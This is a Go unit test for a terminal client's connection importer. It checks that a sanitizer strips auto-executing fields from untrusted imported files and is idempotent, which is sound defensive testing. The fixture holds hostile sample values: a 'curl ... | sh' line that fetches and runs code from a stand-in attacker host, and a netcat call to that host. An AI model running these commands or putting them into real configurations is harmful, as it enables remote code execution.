package importer

import (
	"encoding/json"
	"reflect"
	"testing"

	"github.com/ys-ll/uniterm/backend/session"
)

// TestSanitizeImportedClearsExecFields pins the untrusted-file boundary: an
// imported connection keeps its identity and credentials but never the three
// fields that execute without UI confirmation. want is an independent
// literal, so a DeepEqual miss on any other field means sanitize touched
// something it must not have.
func TestSanitizeImportedClearsExecFields(t *testing.T) {
	data := session.ConnectionStoreData{
		Groups: []session.ConnectionGroup{{ID: "g1", Name: "prod"}},
		Connections: []session.ConnectionConfig{{
			ID:              "c1",
			Name:            "db",
			Type:            "ssh",
			Host:            "10.0.0.5",
			Port:            22,
			User:            "root",
			AuthType:        "password",
			Password:        "hunter2",
			KeyContent:      "-----BEGIN OPENSSH PRIVATE KEY-----",
			ShellPath:       `admin://C:\Windows\System32\cmd.exe`,
			PostLoginScript: "curl http://evil.example/x | sh",
			PostLoginExpectSteps: []session.PostLoginExpectStep{
				{Expect: "login:", Send: "yes", Enter: true, TimeoutSecond: 5},
			},
			X11DesktopDesktopType: "custom",
			X11DesktopCustomCmd:   "xterm -e nc evil.example 4444",
			GroupId:               strptr("g1"),
			WorkspaceMembers: []session.SavedWorkspaceMember{
				{ID: "m1", ConnectionID: "c1", Type: "ssh", Title: "db"},
			},
			WorkspaceLayout: &session.SavedWorkspaceLayoutNode{Type: "leaf", MemberID: "m1"},
		}},
	}
	want := session.ConnectionStoreData{
		Groups: []session.ConnectionGroup{{ID: "g1", Name: "prod"}},
		Connections: []session.ConnectionConfig{{
			ID:                    "c1",
			Name:                  "db",
			Type:                  "ssh",
			Host:                  "10.0.0.5",
			Port:                  22,
			User:                  "root",
			AuthType:              "password",
			Password:              "hunter2",
			KeyContent:            "-----BEGIN OPENSSH PRIVATE KEY-----",
			ShellPath:             `admin://C:\Windows\System32\cmd.exe`,
			X11DesktopDesktopType: "custom",
			GroupId:               strptr("g1"),
			WorkspaceMembers: []session.SavedWorkspaceMember{
				{ID: "m1", ConnectionID: "c1", Type: "ssh", Title: "db"},
			},
			WorkspaceLayout: &session.SavedWorkspaceLayoutNode{Type: "leaf", MemberID: "m1"},
		}},
	}

	SanitizeImported(&data)
	assertStoresEqual(t, "after first call", data, want)

	// Idempotent: a second call must not change anything further.
	SanitizeImported(&data)
	assertStoresEqual(t, "after second call", data, want)

	// Nil and empty stores are no-ops, never panics.
	SanitizeImported(nil)
	var empty session.ConnectionStoreData
	SanitizeImported(&empty)
}

func assertStoresEqual(t *testing.T, when string, got, want session.ConnectionStoreData) {
	t.Helper()
	if reflect.DeepEqual(got, want) {
		return
	}
	gotJSON, _ := json.MarshalIndent(got, "", "  ")
	wantJSON, _ := json.MarshalIndent(want, "", "  ")
	t.Fatalf("store mismatch %s:\ngot:  %s\nwant: %s", when, gotJSON, wantJSON)
}
